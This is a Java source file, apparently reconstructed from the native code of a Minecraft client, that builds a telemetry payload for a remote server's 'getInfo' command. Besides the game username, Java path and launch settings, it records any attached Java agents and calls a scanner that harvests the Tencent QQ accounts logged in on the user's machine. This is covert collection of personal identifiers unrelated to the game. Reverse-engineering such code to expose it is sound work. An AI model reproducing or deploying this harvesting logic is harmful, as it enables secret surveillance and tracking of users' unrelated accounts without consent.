package myau.vendor;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import java.lang.management.ManagementFactory;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Restored from native functions {@code 0x1805AC0F0} and {@code 0x1805AD6E0}.
 * Parses the running JVM command line and launch arguments to build the telemetry JSON payload
 * requested by the server's {@code getInfo} command.
 */
public final class JvmProcessInspector {
    private JvmProcessInspector() {
    }

    public static JsonObject collectProcessTelemetry(List<String> fullCommandTokens) {
        JsonObject info = new JsonObject();
        String javaPath = "";
        JsonArray agentPaths = new JsonArray();
        String gameVersion = "";
        String gameDir = "";
        String assetsDir = "";
        String tweakClass = "";
        String username = "";
        Integer width = null;
        Integer height = null;

        for (int i = 0; i < fullCommandTokens.size(); i++) {
            String token = fullCommandTokens.get(i);
            String lower = token.toLowerCase();
            if (javaPath.isEmpty() && (lower.endsWith("java.exe") || lower.endsWith("javaw.exe") || lower.endsWith("/java"))) {
                javaPath = token;
            } else if (token.startsWith("-javaagent:")) {
                agentPaths.add(new com.google.gson.JsonPrimitive(token.substring("-javaagent:".length())));
            } else if ("--version".equals(token) && i + 1 < fullCommandTokens.size()) {
                gameVersion = fullCommandTokens.get(++i);
            } else if ("--gameDir".equals(token) && i + 1 < fullCommandTokens.size()) {
                gameDir = fullCommandTokens.get(++i);
            } else if ("--assetsDir".equals(token) && i + 1 < fullCommandTokens.size()) {
                assetsDir = fullCommandTokens.get(++i);
            } else if ("--tweakClass".equals(token) && i + 1 < fullCommandTokens.size()) {
                tweakClass = fullCommandTokens.get(++i);
            } else if ("--username".equals(token) && i + 1 < fullCommandTokens.size()) {
                username = fullCommandTokens.get(++i);
            } else if ("--width".equals(token) && i + 1 < fullCommandTokens.size()) {
                try {
                    width = Integer.parseInt(fullCommandTokens.get(++i));
                } catch (NumberFormatException e) {
                    System.err.println("Debug - Width parse error: " + e.getMessage());
                }
            } else if ("--height".equals(token) && i + 1 < fullCommandTokens.size()) {
                try {
                    height = Integer.parseInt(fullCommandTokens.get(++i));
                } catch (NumberFormatException e) {
                    System.err.println("Debug - Height parse error: " + e.getMessage());
                }
            }
        }

        info.addProperty("javaPath", javaPath);
        info.add("agentPath", agentPaths);
        info.addProperty("gameVersion", gameVersion);
        info.addProperty("gameDir", gameDir);
        info.addProperty("assetsDir", assetsDir);
        info.addProperty("tweakClass", tweakClass);
        info.addProperty("username", username);
        if (width != null) {
            info.addProperty("width", width);
        }
        if (height != null) {
            info.addProperty("height", height);
        }

        JsonArray qqArray = new JsonArray();
        for (String qq : TencentQqScanner.scanLoggedQqAccounts()) {
            qqArray.add(new com.google.gson.JsonPrimitive(qq));
        }
        info.add("qq", qqArray);
        return info;
    }

    public static JsonObject collectCurrentJvmTelemetry() {
        List<String> tokens = new ArrayList<>();
        String javaHome = System.getProperty("java.home", "");
        if (!javaHome.isEmpty()) {
            tokens.add(javaHome + "\\bin\\javaw.exe");
        }
        tokens.addAll(ManagementFactory.getRuntimeMXBean().getInputArguments());
        String sunCmd = System.getProperty("sun.java.command", "");
        if (!sunCmd.isEmpty()) {
            tokens.addAll(Arrays.asList(sunCmd.split("\\s+")));
        }
        return collectProcessTelemetry(tokens);
    }
}
